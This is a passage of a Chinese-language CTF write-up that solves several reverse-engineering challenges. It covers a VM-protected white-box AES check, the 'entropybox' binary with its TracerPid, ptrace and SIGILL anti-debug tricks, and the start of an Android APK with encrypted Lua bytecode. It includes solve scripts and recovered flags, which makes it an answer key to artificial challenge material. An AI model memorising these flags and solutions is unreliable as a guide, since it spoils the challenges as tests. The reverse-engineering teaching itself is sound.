13 -> 0x3a88a
14 -> 0x3ae8e
15 -> 0x3b9f4
```

这里有一个容易踩坑的点：跳表元素是相对跳表基址的 rel32，不是相对元素自身地址。比如二级 VM 的第 5 个入口应该是：

```text
0x8508 + rel32 = 0x371e7
```

不是 `0x8518 + rel32`。

**主 VM helper: sub\_2B970**

`sub_2B970` 是主 VM 外部 helper 分发：

```c
char sub_2B970(uint64_t a1) {
    if (a1 == 0) {
        qword_954FD = sub_21FA0(qword_954ED, qword_954F5, 0);
    } else if (a1 == 1) {
        qword_95516 = -1;
    } else if (a1 == 2) {
        qword_9552E = strlen_chk(qword_9551E, qword_95526);
    } else if (a1 == 3) {
        byte_9555A = sub_21FE0(qword_95551, byte_95559) & 1;
    } else if (a1 == 4) {
        sub_22040(qword_9555C, qword_95564, qword_9556C);
    }
}
```

其中：

```text
sub_21FA0 = JNIEnv->GetStringUTFChars
sub_22040 = JNIEnv->ReleaseStringUTFChars
```

这两个函数可以通过 JNIEnv vtable 偏移确认：

```text
sub_21FA0: call [(*env) + 0x548] = GetStringUTFChars
sub_22040: call [(*env) + 0x550] = ReleaseStringUTFChars
```

主 VM 的动态 trace 显示 helper 调用顺序固定：

```text
pc 0x1b1: helper 0 -> GetStringUTFChars
pc 0x25d: helper 1 -> set strlen bound = -1
pc 0x2ba: helper 2 -> strlen
pc 0x417: helper 3 -> sub_21FE0(chars, len)
pc 0x489: helper 4 -> ReleaseStringUTFChars
pc 0x545: opcode 0xA -> byte_95440 = byte_9555A
```

因此主 VM 伪代码为：

```c
bool checkFlag(JNIEnv *env, jobject obj, jstring s) {
    char *p = GetStringUTFChars(env, s, 0);
    size_t n = strlen(p);
    bool ok = sub_21FE0(p, (uint8_t)n);
    ReleaseStringUTFChars(env, s, p);
    return ok;
}
```

主 VM 相关全局变量语义表：

|变量|语义|依据|
|---|---|---|
|`qword_95441`|`JNIEnv *env`|`sub_21B80` 第一个参数保存到这里|
|`qword_95449`|`jobject obj` / `jclass`|`sub_21B80` 第二个参数|
|`qword_95451`|Java 传入的 `jstring`|`sub_21B80` 第三个参数|
|`byte_95440`|最终 boolean 返回值|`sub_21B80` 返回 `byte_95440`|
|`qword_95588`|main VM memory base|被设置为 `&byte_95440`|
|`qword_95590`|main VM bytecode base|被设置为 `0x17140`|
|`dword_95584`|main VM PC|每次取 byte 后自增，跳转时改成 target|
|`qword_955A0`|当前 basic block 起始 PC|每次 block reload 时保存旧 PC|
|`dword_955A8`|opcode decode seed|basic block 前 4 字节|
|`dword_955AC`|operand/opcode byte decode seed|basic block 后 4 字节|
|`qword_954ED`|helper 0 的 `JNIEnv *` 参数|传给 `sub_21FA0`|
|`qword_954F5`|helper 0 的 `jstring` 参数|传给 `sub_21FA0`|
|`qword_954FD`|`GetStringUTFChars` 返回的 `char *`|helper 0 写入|
|`qword_9551E`|`strlen` 的 `char *` 参数|helper 2 使用|
|`qword_95526`|`strlen_chk` bound 参数|helper 2 使用，VM 中设置为无符号全 1|
|`qword_9552E`|`strlen` 返回值|helper 2 写入|
|`qword_95551`|传给 `sub_21FE0` 的 `char *`|helper 3 使用|
|`byte_95559`|传给 `sub_21FE0` 的长度低 8 位|helper 3 使用|
|`byte_9555A`|`sub_21FE0` 返回值|helper 3 写入，最后给 `byte_95440`|
|`qword_9555C`|`ReleaseStringUTFChars` 的 `JNIEnv *`|helper 4 使用|
|`qword_95564`|`ReleaseStringUTFChars` 的 `jstring`|helper 4 使用|
|`qword_9556C`|`ReleaseStringUTFChars` 的 `char *`|helper 4 使用|

这些地址很多是非 8 字节对齐的全局 slot，本质上是 VM memory overlay，IDA 会按引用宽度自动命名成 `qword_xxx` / `byte_xxx`。

**二级 VM wrapper: sub\_21FE0**

`sub_21FE0` 不是字符访问函数，而是另一个 VM wrapper：

```c
uint8_t sub_21FE0(char *s, uint8_t len) {
    qword_955B1 = s;
    byte_955B9 = len;

    qword_95670 = &byte_955B0;   // char VM memory base
    qword_95678 = &unk_17690;    // char VM bytecode base

    sub_34D90();                 // char/check VM interpreter
    return byte_955B0 & 1;
}
```

动态 trace 里，二级 VM 主要做三件事：

```text
1. 准备输出缓冲区 out[32]
2. 调 sub_22080(input, len, out)
3. for i in 0..31:
       target_i = sub_22270(i)
       acc |= out[i] ^ target_i
   return acc == 0
```

二级 VM helper 可以从 `0x34CC0` 附近确认：

```text
a1 == 0: 清空 32 字节输出缓冲
a1 == 1: sub_22080(qword_95617, byte_9561F, qword_95620)
a1 == 2: byte_95645 = sub_22270(byte_95644)
```

trace 中 `a1 == 2` 每轮的 `byte_95644` 正好是 index，返回值 `byte_95645` 是目标密文字节。

二级 VM 相关全局变量语义：

|变量|语义|
|---|---|
|`byte_955B0`|二级 VM 返回值|
|`qword_955B1`|输入 `char *`|
|`byte_955B9`|输入长度低 8 位|
|`qword_95670`|char VM memory base，值为 `&byte_955B0`|
|`qword_95678`|char VM bytecode base，值为 `0x17690`|
|`dword_95668`|char VM PC|
|`dword_95690`|char VM opcode decode seed|
|`dword_95694`|char VM operand/opcode byte decode seed|
|`qword_95617`|`sub_22080` 的 input 参数|
|`byte_9561F`|`sub_22080` 的 len 参数|
|`qword_95620`|`sub_22080` 的 out 参数，指向 VM memory 中的 32 字节 buffer|
|`byte_95644`|`sub_22270(index)` 的 index|
|`byte_95645`|`sub_22270(index)` 返回的 target byte|

**提取目标密文**

二级 VM 比较逻辑里，hook `char_helper(a1=2)` 就能直接拿到 target：

```text
idx 0x00 -> 0x4d
idx 0x01 -> 0x7f
idx 0x02 -> 0xfb
...
idx 0x1f -> 0x60
```

完整 32 字节目标：

```text
4d 7f fb 79 08 0d af 74 28 db 5c 2a 56 0d 6d ef
a1 e6 b4 d0 24 bb 2e 41 9e be 84 76 48 08 75 60
```

二级 VM 最终伪代码：

```c
bool sub_21FE0(char *s, uint8_t len) {
    uint8_t out[32] = {0};
    sub_22080(s, len, out);

    uint8_t acc = 0;
    for (int i = 0; i < 32; i++) {
        acc |= out[i] ^ target[i];
    }
    return acc == 0;
}
```

**sub\_22080: 白盒 AES 外层**

`sub_22080(input, len, out)` 是本题核心变换。静态看它不是 `memcmp`，而是 32 字节分组变换。

逻辑：

```c
uint8_t buf[32] = {0};
uint8_t prev[16] = {0};

copy_len = len < 32 ? len : 32;
memcpy(buf, input, copy_len);

if (len <= 32) {
    pad = 0x20 - len;
    for (i = len; i < 32; i++) {
        buf[i] = pad;
    }
}

for (block = 0; block < 32; block += 16) {
    for (j = 0; j < 16; j++) {
        b = buf[block + j];
        if (block == 0) {
            state[j] = pre_table_transform(j, b);
        } else {
            state[j] = b ^ prev[j];
        }
    }

    sub_22380(state);       // AES encrypt one block
    memcpy(out + block, state, 16);
    memcpy(prev, state, 16);
}
```

第一块进入 AES 前还有一个位置相关前置表：

```c
uint8_t pre_table_transform(int pos, uint8_t b) {
    uint8_t v = table_0xACD0[pos][b];
    v ^= (0x59 * pos + 0x11 * b + 0x42) & 0xff;
    v ^= ((b + pos * pos) ^ 0xA7) & 0xff;
    return v;
}
```

第二块是类似 CBC：

```text
block1_input = plaintext_block1 ^ ciphertext_block0
```

**sub\_22380: AES block**

`sub_22380` 是 16 字节 block 加密。hook 内部函数可以看到标准 AES 轮结构：

```text
sub_223C0 = AddRoundKey
sub_22450 = SubBytes
sub_224A0 = ShiftRows
sub_224E0 = MixColumns
```

轮顺序：

```text
AddRoundKey(0)
for round 1..9:
    SubBytes
    ShiftRows
    MixColumns
    AddRoundKey(round)
final round:
    SubBytes
    ShiftRows
    AddRoundKey(10)
```

从第一轮 AddRoundKey 前后可以直接恢复 key。以输入 `flag` 的第一块 trace 为例：

```text
AddRoundKey 前:
10 01 11 4a 78 65 72 7d 71 75 7f 31 6e 79 7b 3d

AddRoundKey 后:
75 7b 67 27 55 12 10 50 10 10 0c 1c 5c 49 49 0b
```

异或：

```text
65 7a 76 6d 2d 77 62 2d 61 65 73 2d 32 30 32 36
```

ASCII：

```text
ezvm-wb-aes-2026
```

所以 `sub_22380` 可以直接等价为：

```python
AES.new(b"ezvm-wb-aes-2026", AES.MODE_ECB).encrypt(block)
```

解题脚本：

```python
from pathlib import Path

from Crypto.Cipher import AES

LIB = Path("out/lib/x86_64/libezvm.so")
KEY = b"ezvm-wb-aes-2026"
TARGET = bytes.fromhex(
    "4d7ffb79080daf7428db5c2a560d6def"
    "a1e6b4d024bb2e419ebe847648087560"
)
PRE_TABLE = 0xACD0

def pre_byte(blob: bytes, pos: int, value: int) -> int:
    v = blob[PRE_TABLE + pos * 256 + value]
    v ^= (0x59 * pos + 0x11 * value + 0x42) & 0xFF
    v ^= ((value + pos * pos) ^ 0xA7) & 0xFF
    return v & 0xFF

def invert_pre_table(blob: bytes):
    inv = []
    for pos in range(16):
        m = {}
        for value in range(256):
            out = pre_byte(blob, pos, value)
            if out in m:
                raise RuntimeError(f"pre-table collision at pos {pos}")
            m[out] = value
        inv.append(m)
    return inv

def encrypt_like_native(blob: bytes, plain32: bytes) -> bytes:
    aes = AES.new(KEY, AES.MODE_ECB)
    b0 = bytes(pre_byte(blob, i, plain32[i]) for i in range(16))
    c0 = aes.encrypt(b0)
    b1 = bytes(plain32[16 + i] ^ c0[i] for i in range(16))
    c1 = aes.encrypt(b1)
    return c0 + c1

def main():
    blob = LIB.read_bytes()
    aes = AES.new(KEY, AES.MODE_ECB)
    inv = invert_pre_table(blob)

    b0 = aes.decrypt(TARGET[:16])
    b1_xor = aes.decrypt(TARGET[16:])
    p0 = bytes(inv[i][b0[i]] for i in range(16))
    p1 = bytes(b1_xor[i] ^ TARGET[i] for i in range(16))
    padded = p0 + p1

    pad = padded[-1]
    flag = padded[:-pad]

    print("target:", TARGET.hex())
    print("key:", KEY.decode())
    print("padded:", padded)
    print("flag:", flag.decode())
    print("verify:", encrypt_like_native(blob, padded).hex() == TARGET.hex())

if __name__ == "__main__":
    main()

```

![Image](./images/img-065.png)

![Image](./images/img-066.png)

H\&NCTF\{ez\_wbaes\_vm\_2026\}





## 题目名称：entropybox

解题人：weixiao

解题过程：

IDA打开，字符串区很直白：

```text
/proc/self/status
TracerPid:
offer your token: 
congratulations!!
H&NCTF{warmup_flag_not_here}     <- 假 flag
nope, try again
almost there, keep digging
box://vacuum/echo
```

分析main函数

`0x401215` \| `sigemptyset` \+ `sigaction(SIGILL, handler=0x401a30, ...)` 注册 `SIGILL` 处理器

![Image](./images/img-067.png)

`0x401243` \| `fopen("/proc/self/status", "r")` 逐行 `fgets` 找 `"TracerPid:"`，把数字 `strtoul` 出来存到 `0x404144` 

![Image](./images/img-068.png)

`0x4012c1` \| 输出 `offer your token: ` 并 `fgets` 0x60 字节 token 

![Image](./images/img-069.png)

`0x4013a0` \| 进入 `0x140000` 次 PRNG 主循环；命中 16 次 `ud2`，每次 `SIGILL` 处理器写一个字节到 `0x404130` 

![Image](./images/img-070.png)

`0x4016c0` \| 调用 `ptrace(PTRACE_TRACEME, 0, 1, 0)`；返回值是否 \< 0 决定 `0x404140` 

![Image](./images/img-071.png)

`0x4016e8`、`0x401723` \| 两次字节级 rol/xor 混淆，把 `0x404130` 的 16 字节扩展成 `0x404120` 的 16 字节会话密钥

`0x401776` 起 \| 调用两次 `0x401ab0` 的轮函数，对 `0x402110/0x402100` 加密，结果落到 `0x404100/0x404110`

![Image](./images/img-072.png)

`0x4017e0` \| 用 `0x4020e0` 的 32 字节置换索引，对上一步的 32 字节状态做 `dst[i] = state[perm[i]]`

![Image](./images/img-073.png)

`0x401855` 起 \| SSE2 比较 token 与上一步结果是否一致；任何失败都跳 `nope/almost`

![Image](./images/img-074.png)

`0x401922` \| 命中即输出 `congratulations!!`；同时把 `H&NCTF{` 前缀（`0x4020c0` 异或 `0x6d`）拼上结果 \+ `}` 即真 flag 

![Image](./images/img-075.png)

**PRNG 主循环（关键）**

寄存器初值：

```text
r13 = 0x6a09e667f3bcc909      ; sqrt(2) frac bits
r14 = 0xd1b54a32d192ed03      ; sqrt(3)*2^63
rbp = 0x81de766bd28c0000
ebx = 0x140000                ; 倒计数
```

每轮：

```c
// MurmurHash3 风格 finalizer
a   = rol64(r13 ^ rbp, 7);
a   = a + r14;
a  ^= ror64(a, 11);
a  *= 0x94d049bb133111eb;
a  ^= a >> 31;
r13 = a;

rbp += 0x61c8864e7a143579;    // 黄金比例增量
ebx -= 1;
```

里面还混入了 \`pow / sin / cos\`，那段只用于改写一个浮点累加器 \`0x404150\`，最后只看它是否 \`\>= 0\`，跟 token 校验**完全无关**——纯粹是熵注入烟雾弹。

**16 次 SIGILL：解密点检测**

`0x401537` 处把全局 `counter = *(0x404148)` 与硬编码表 `0x402140` 的当前条目比较。`0x402140` 的 16 个 32\-bit 值就是 16 个 ebx 触发点：

```text
0x0013F201, 0x0013B6A7, 0x0013794C, 0x00133F10,
0x001302D5, 0x0012C76A, 0x00128B20, 0x00124EF5,
0x0012138A, 0x0011D743, 0x00119A1E, 0x00115CE4,
0x00112099, 0x0010E44F, 0x0010A7E0, 0x00106A12
```

命中后做一次 6\-bit S\-box 校验：

```c
r8d  = ((r13 >> 9)  ^ r13) ^ ebx;       r8d &= 0x3f;
edx  = ((r13 >> 27) ^ (r13 >> 41));     edx &= 0x7;
sum  = edx + r8d;
r9   = sum & 0x3f;
edx  = ((sum >> 1) & 0x1f) ^ ((r9 << 2) & 0xff);
edx ^= sbox402180[r8d];
edx ^= sbox402180[r9];
edx &= 0x3f;
if (edx != const_4021c0[counter]) continue;     // 不命中就退回继续转 PRNG
```

`sbox402180` 是 64 字节 S\-box，前 16 字节 `const_4021c0` 是预计算的目标值（每个都 \< 0x40）。这套校验的作用是"只有 PRNG 状态精确踩在这 16 个点上时才让流程通过"——出题人保证了这 16 个 `ebx` 一定能依次命中。

通过后构造 R12/R15 ：

```c
rsi  = (counter + ebx + 0x1234) * 0x9e3779b185ebca87;
rsi ^= r13;
rsi ^= 0xa5a55a5aa5a55a5a;
rsi  = rol64(rsi, 7) + r14;
rsi ^= ror64(rsi, 11);
rsi *= 0x94d049bb133111eb;
rsi ^= rsi >> 31;
R12 = rsi;

ecx_xor = (counter ^ ebx) ^ 0xd00dfeed;
rdx     = (uint64_t)ecx_xor * 0x9e3779b185ebca87;
rdx    ^= 0x9e3779b97f4a7c15 + r13;
rdx     = rol64(rdx, 7) + r14;
rdx    ^= ror64(rdx, 11);
rdx    *= 0x94d049bb133111eb;
rdx    ^= rdx >> 31;
R15 = rdx;

ud2;                 // 故意非法指令，主动触发 SIGILL
```

CPU 抛 \`SIGILL\` → handler \`0x401a30\` 把 R12 / R15 / \`0x402120\[counter\]\` 三者按字节 XOR，写入 \`0x404130 \+ counter\`。这就是题目"Signal error"的灵魂——**正常程序逻辑通过 SIGILL 异常上下文传递数据**。

`0x402120` 的 16 字节：

```text
47 8d 5c f2 19 36 b6 fa 77 c0 4c 86 d5 ed 7f e3
```

最后得到的 16 字节中间结果（仿真值）：

```text
51 5b 8a 90 df 6a 7f e1 3a c7 51 9d 24 e8 76 0b
```

**4\. 两轮字节混淆 → 16 字节会话密钥**

落地 `0x404130` 之后，`0x4016e8` 和 `0x401723` 两个循环对它做了两轮交叉的 ROL/XOR，写到 `0x404120` 处当作真正的会话密钥：

```python
# 第一轮 rax = 3..10
sk[rax-3] = rol8(result[8 + (rax & 7)], 1) ^ result[rax-3]

# 第二轮 rax = 5..12，常量来自 0x4021cb 起的 8 字节
sk[rax+3] = rol8(result[rax & 7], 3) ^ result[rax+3] ^ const_4021c0[11 + rax]
```

仿真结果：

```text
6a 13 5b 7c c9 1e f0 43 2d 88 74 b1 aa 56 c0 de
```

**自定义 16 轮轮函数（0x401ab0）**

输入：16 字节 `state_key`、16 字节明文。每轮内部用 `bp / di / r8` 做有状态扰动，操作严格区分 8\-bit / 32\-bit 宽度，关键步骤：

```python
rcx_idx = (rax + 7) & 0xf
rdx_idx = (5*rax + (di & 0xff) + (bp & 0xff)) & 0xf
edx     = state_key[rdx_idx]
sil     = ((r8 + bp) & 0xff) + state_key[rcx_idx]
sil     = ror8(sil, ((di & 0xff) >> 5) & 7)
bl      = rol8(di ^ rax ^ edx, ((bp+rax) & 0xff) & 7)
sil    ^= bl
out[rax] = sil ^ input[rax]
edx_new  = ((edx ^ bp) ^ sil) ^ rax    # 32-bit
di       = (edx + di + 0x3d) + (sil ^ rax)
bp       = rol8(edx_new & 0xff, 1) | (edx_new & 0xffffff00) + 0x17
```

主流程对两个 16 字节明文表各调用一次：

```text
input1 = 0x402110: b4 87 2c 16 16 f8 86 2a 70 03 8b 78 5f 31 4f e6
input2 = 0x402100: ee 85 7a 12 4c fd d1 2b 26 5e d3 2a 5d 3d 4e e2

out_hi = round(sk, input1) = 0x404100  -> "b743baa0a8ac3483"
out_lo = round(sk, input2) = 0x404110  -> "85b78d617e911897"
```

拼起来正好是 32 字节 ASCII 十六进制

**置换 \+ 拼装**

`0x4020e0` 的 32 字节是 0\.\.0x1f 的置换：

```text
0b 04 17 01 12 1d 07 0e 1e 09 14 02 1b 0c 18 05
10 1f 08 15 00 19 0d 1c 06 13 0a 1a 03 16 0f 11
```

对 32 字节状态做 `sub[i] = state[perm[i]]`，得到：

```text
cb17b8089884137a87adbe41a7a93635
```

**解题脚本**

```python

MASK64 = (1 << 64) - 1
MASK32 = (1 << 32) - 1

def rol64(x, n):
    n &= 63
    if n == 0:
        return x & MASK64
    return ((x << n) | (x >> (64 - n))) & MASK64

def ror64(x, n):
    n &= 63
    if n == 0:
        return x & MASK64
    return ((x >> n) | (x << (64 - n))) & MASK64

def rol8(x, n):
    n &= 7
    if n == 0:
        return x & 0xff
    return ((x << n) | (x >> (8 - n))) & 0xff

def ror8(x, n):
    n &= 7
    if n == 0:
        return x & 0xff
    return ((x >> n) | (x << (8 - n))) & 0xff

# -------- rodata constants --------
sbox_402180 = bytes.fromhex(
    "1337c0de429a7d11fe65284b90afd15c738e192ab7cce45f016b3d84aaf01739"
    "4e92bd0758c16e23d8740a95eb314f68821ca6dd3b57f9204a718bce1463adf2"
)  # 64 bytes
expected_4021c0_first16 = bytes.fromhex("3c3434213d1d062a04372b18321b1c03")
const_4021c0 = bytes.fromhex(
    "3c3434213d1d062a04372b18321b1c03"
    "44b42aa654ea322bde44dc4eb065dfbf"
)  # 32 bytes (used for the byte mixing too at offset 11)

table_402120 = bytes.fromhex("478d5cf21936b6fa77c04c86d5ed7fe3")  # 16 bytes
table_ebx_402140 = [
    0x0013f201, 0x0013b6a7, 0x0013794c, 0x00133f10,
    0x001302d5, 0x0012c76a, 0x00128b20, 0x00124ef5,
    0x0012138a, 0x0011d743, 0x00119a1e, 0x00115ce4,
    0x00112099, 0x0010e44f, 0x0010a7e0, 0x00106a12,
]
input_table_402100 = bytes.fromhex("ee857a124cfdd12b265ed32a5d3d4ee2")  # 16 bytes
input_table_402110 = bytes.fromhex("b4872c1616f8862a70038b785f314fe6")  # 16 bytes
src_4020e0 = bytes.fromhex(
    "0b0417011 21d070e1e0914021b0c1805"
    "101f0815 00190d1c06130a1a03160f11".replace(" ", "")
)  # 32 bytes - permutation indices
prefix_4020c0 = bytes.fromhex("254b232e392b16")  # 7 bytes XOR 0x6d == "H&NCTF{"

# -------- stage 1 --------
def stage1_compute_result_bytes():
    K1 = 0x94d049bb133111eb
    K2 = 0x9e3779b185ebca87
    K3 = 0xa5a55a5aa5a55a5a
    K4 = 0x9e3779b97f4a7c15
    GOLDEN = 0x61c8864e7a143579

    r13 = 0x6a09e667f3bcc909
    r14 = 0xd1b54a32d192ed03
    rbp = 0x81de766bd28c0000

    counter = 0
    result = bytearray(16)

    for it in range(0x140000):
        ebx = (0x140000 - it) & MASK32

        # r13 update: r13 = mix(r13 ^ rbp, r14, K1)
        a = r13 ^ rbp
        a = rol64(a, 7)
        a = (a + r14) & MASK64
        b = ror64(a, 11)
        a ^= b
        a = (a * K1) & MASK64
        a ^= (a >> 31)
        r13 = a & MASK64

        if counter <= 15 and table_ebx_402140[counter] == ebx:
            # Compute sbox check
            r8d = (((r13 >> 9) ^ r13) & MASK32) ^ ebx
            edi32 = (r13 >> 41) & MASK32
            edx = ((r13 >> 27) & MASK32) ^ edi32
            r8d &= 0x3f
            edx &= 0x7
            sum_idx = (edx + r8d) & 0xff  # could be up to 7 + 63 = 70

            r9d = sum_idx & 0x3f
            edx_shifted = (sum_idx >> 1) & 0x1f
            r10d = (r9d << 2) & 0xff
            edx_v = edx_shifted ^ r10d ^ sbox_402180[r8d] ^ sbox_402180[r9d]
            edx_v &= 0x3f

            target = const_4021c0[counter]  # already < 0x40
            if edx_v == target:
                # Compute R12, R15
                rsi = (counter + ebx + 0x1234) & MASK32
                ecx = (counter ^ ebx) & MASK32

                rsi = (rsi * K2) & MASK64
                rsi ^= r13
                rsi ^= K3
                rsi = rol64(rsi, 7)
                rsi = (rsi + r14) & MASK64
                tmp = ror64(rsi, 11)
                rsi ^= tmp

                edx_low = (ecx ^ 0xd00dfeed) & MASK32

                rsi = (rsi * K1) & MASK64
                rcx_full = (K4 + r13) & MASK64
                rdx_full = (edx_low * K2) & MASK64
                rdi_full = rsi
                rdx_full ^= rcx_full
                rdi_full >>= 31
                rdx_full = rol64(rdx_full, 7)
                rsi ^= rdi_full
                rdx_full = (rdx_full + r14) & MASK64
                rcx_full = ror64(rdx_full, 11)
                rdx_full ^= rcx_full
                rdx_full = (rdx_full * K1) & MASK64
                rcx_full = rdx_full >> 31
                rdx_full ^= rcx_full

                r12 = rsi & MASK64
                r15 = rdx_full & MASK64

                byte = (r15 ^ r12 ^ table_402120[counter]) & 0xff
                result[counter] = byte
                counter += 1
                if counter == 16:
                    break

        rbp = (rbp + GOLDEN) & MASK64

    print(f"[stage1] counter={counter}")
    print(f"[stage1] result(16) = {bytes(result).hex()}")
    return bytes(result)

# -------- stage 2 --------
def stage2_session_key(result):
    sk = bytearray(16)
    # loop 1: rax = 3..10  -> sk[rax-3] = rol(result[8 + (rax & 7)], 1) ^ result[rax-3]
    for rax in range(3, 11):
        sk[rax - 3] = rol8(result[8 + (rax & 7)], 1) ^ result[rax - 3]
    # loop 2: rax = 5..12  -> sk[rax+3] = rol(result[rax & 7], 3) ^ result[rax + 3] ^ const_4021c0[11 + rax]
    for rax in range(5, 13):
        sk[rax + 3] = rol8(result[rax & 7], 3) ^ result[rax + 3] ^ const_4021c0[11 + rax]
    print(f"[stage2] session_key = {bytes(sk).hex()}")
    return bytes(sk)

# -------- stage 3 --------
def round_function(state_key, input_data):
    """Emulates 0x401ab0. 16 rounds, returns 16 output bytes."""
    out = bytearray(16)
    bp = 0xffffffa7
    di = 0x63
    r8 = 0

    for rax in range(16):
        # esi = bp & 0xff (zero-extended into rsi)
        # ecx = di & 0xff
        # rdx = 5 * rax
        # ebx = di (32-bit)
        # rcx = (di & 0xff) + (bp & 0xff)
        rcx = ((di & 0xff) + (bp & 0xff)) & MASK64
        # esi = (r8 + bp) & MASK32   <-- overwrites esi with full 32-bit value
        esi = (r8 + bp) & MASK32
        # ebx ^= rax (32-bit)
        ebx = (di ^ rax) & MASK32
        # r8 += 13
        r8 = (r8 + 13) & MASK32
        # rdx = (5 * rax + rcx) & MASK64
        rdx_idx = (5 * rax + rcx) & 0xf
        rcx_idx = (rax + 7) & 0xf
        # edx = state_key[rdx_idx]  (low 8 bits)
        edx = state_key[rdx_idx]  # 0..255
        # sil += state_key[rcx_idx]  (only low byte of esi changes)
        sil = (esi & 0xff)
        sil = (sil + state_key[rcx_idx]) & 0xff
        esi = (esi & 0xffffff00) | sil
        # ecx = di; cl >>= 5    (only cl changes, upper bits of ecx unchanged from di)
        cl_byte = ((di & 0xff) >> 5) & 0xff
        # ror sil by cl
        rot_eff = cl_byte & 7  # mask to 5 bits, then mod 8
        if rot_eff:
            sil = ((sil >> rot_eff) | (sil << (8 - rot_eff))) & 0xff
            esi = (esi & 0xffffff00) | sil
        # ecx = (bp + rax) & MASK32   (full overwrite)
        ecx = (bp + rax) & MASK32
        # new_di = (edx + di + 0x3d) & MASK32
        new_di = (edx + di + 0x3d) & MASK32
        # ebx ^= edx (32-bit)
        ebx = (ebx ^ edx) & MASK32
        # bl = rol(bl, cl)  cl = low byte of ecx
        rot_eff2 = (ecx & 0xff) & 7
        bl = ebx & 0xff
        if rot_eff2:
            bl = ((bl << rot_eff2) | (bl >> (8 - rot_eff2))) & 0xff
            ebx = (ebx & 0xffffff00) | bl
        # edx ^= bp (32-bit)
        edx = (edx ^ bp) & MASK32
        # esi ^= ebx (32-bit)
        esi = (esi ^ ebx) & MASK32
        # ecx_save = esi
        ecx_save = esi
        # sil ^= input[rax]
        out_byte = (esi & 0xff) ^ input_data[rax]
        out[rax] = out_byte
        # edx ^= ecx_save (32-bit)
        edx = (edx ^ ecx_save) & MASK32
        # esi = ecx_save ^ rax (32-bit)
        esi = (ecx_save ^ rax) & MASK32
        # dl = rol(dl, 1)
        dl = (edx & 0xff)
        dl = ((dl << 1) | (dl >> 7)) & 0xff
        edx = (edx & 0xffffff00) | dl
        # di = (new_di + esi) & MASK32
        di = (new_di + esi) & MASK32
        # bp = (edx + 0x17) & MASK32
        bp = (edx + 0x17) & MASK32

    return bytes(out)

# -------- main --------
def main():
    res = stage1_compute_result_bytes()
    sk = stage2_session_key(res)

    out_hi = round_function(sk, input_table_402110)  # stored at 0x404100
    out_lo = round_function(sk, input_table_402100)  # stored at 0x404110
    state = out_hi + out_lo  # 32 bytes
    print(f"[stage3] out_hi (round on 0x402110) = {out_hi.hex()}")
    print(f"[stage3] out_lo (round on 0x402100) = {out_lo.hex()}")
    print(f"[stage3] state(32) = {state.hex()}")

    sub = bytes(state[src_4020e0[i]] for i in range(32))
    print(f"[stage4] sub(32) = {sub.hex()}")

    prefix = bytes(b ^ 0x6d for b in prefix_4020c0)
    flag = prefix + sub + b"}"
    print(f"[stage5] len = {len(flag)}")
    try:
        print(f"[stage5] flag = {flag.decode()}")
    except UnicodeDecodeError:
        print(f"[stage5] flag (raw) = {flag}")
        for i, c in enumerate(flag):
            print(f"  [{i:2d}] 0x{c:02x} {chr(c) if 32 <= c < 127 else '.'}")
    return flag

if __name__ == "__main__":
    main()

```

![Image](./images/img-076.png)

H\&NCTF\{cb17b8089884137a87adbe41a7a93635\}





## 题目名称：and you

解题人：weixiao

解题过程：

对apk进行分析，包名为 `com.aurora.notes`。整体结构看起来像普通 Java 层加 native 校验，但真正逻辑被拆成了几层：Java 入口、`libengine.so`、自定义 Lua 5\.3 字节码、运行时释放的 dex/jar，以及最后一段 native MD5 变体。

主要文件如下：

```text
classes.dex
  com.aurora.notes.MainActivity
  com.aurora.notes.Bridge
  com.aurora.notes.FirstGate

classes2.dex
  arm.EpicVm

lib/arm64-v8a/libengine.so
  真正的校验逻辑，自定义 Lua 5.3 VM 也在这里

lib/arm64-v8a/libyipro.so
  VMP 壳，classes2.dex 中 arm.EpicVm 会加载它

assets/loader.dex
  扩展名是 dex，实际是加密后的 Lua 5.3 字节码

assets/stage.dat
  加密后的第二阶段 jar，运行时写成 stage.jar 后由 DexClassLoader 加载
```

`Bridge.java` 很薄：

![Image](./images/img-077.png)

```java
public final class Bridge {
    public static native String verify(Context context, byte[] bArr, byte[] bArr2, String str);

    static {
        System.loadLibrary("engine");
    }
}
```

`FirstGate.java` 泄露了一组 XXTEA 类常量：

![Image](./images/img-078.png)

```java
private static final int DELTA = -1923030938;
private static final int[] KEY = {826366246, 1398314899, 595878500, 864233365};
private static final int[] WANT = {1213672582, -1111286241, -838853147};
```

**Bridge\.verify 总流程**

在 `libengine.so` 中跟 JNI 注册和 `Bridge.verify`，可以看到它不是直接校验输入，而是启动了一套 Lua 运行环境：

1. 创建 Lua state。

2. 注册三个 native 函数：`native_tail`、`android_write_cache`、`android_load_dex`。

3. 把 `assets/stage.dat` 作为全局 `_stage_blob` 推入 Lua。

![Image](./images/img-079.png)

4. 加载并执行 `assets/loader.dex` 中的 Lua 字节码。

5. 调用 Lua 返回的主校验函数，传入用户输入，返回 `(bool, message)`。

也就是说，主线逻辑在 `loader.dex` 里，`stage.dat` 是由 Lua 解密后继续加载的第二阶段。

**解密 loader\.dex**

`assets/loader.dex` 不是 dex 文件。文件头和 Lua 5\.3 字节码接近，但多个字段被修改。根据 `libengine.so` 中的读 chunk 逻辑，可以还原出以下加密层：

|位置|加密方式|密钥/常量|
|---|---|---|
|Lua 头与 size 字段|XOR|`0x5A17C0DE`|
|整数常量|XOR|`0x13579BDF2468ACE0`|
|浮点常量|XOR|`0x1863791790A6213E`，可用 `370.5` 校验|
|指令字|`~code ^ mut_key32[i % 100]`|100 个 Blowfish pi table word，首项 `0x243f6a88`|
|字符串|`byte ^ mut_key[(81+i)%400] ^ (2*i*i) ^ 0xFE`|同一张 key table|

“脱壳/解码器”，把 assets/loader\.dex 这个假 dex、真 Lua 字节码文件还原成可分析的数据结构

```python
#!/usr/bin/env python3
"""Decode the custom dex-lua bytecode produced by libengine.so back to standard Lua 5.3 binary."""
import struct
import json
import argparse
from pathlib import Path

# mut_key32 array (100 32-bit words) extracted from libengine.so at 0x674c
MUT_KEY32 = [
    0x243f6a88, 0x85a308d3, 0x13198a2e, 0x03707344, 0xa4093822, 0x299f31d0,
    0x082efa98, 0xec4e6c89, 0x452821e6, 0x38d01377, 0xbe5466cf, 0x34e90c6c,
    0xc0ac29b7, 0xc97c50dd, 0x3f84d5b5, 0xb5470917, 0x9216d5d9, 0x8979fb1b,
    0xd1310ba6, 0x98dfb5ac, 0x2ffd72db, 0xd01adfb7, 0xb8e1afed, 0x6a267e96,
    0xba7c9045, 0xf12c7f99, 0x24a19947, 0xb3916cf7, 0x0801f2e2, 0x858efc16,
    0x636920d8, 0x71574e69, 0xa458fea3, 0xf4933d7e, 0x0d95748f, 0x728eb658,
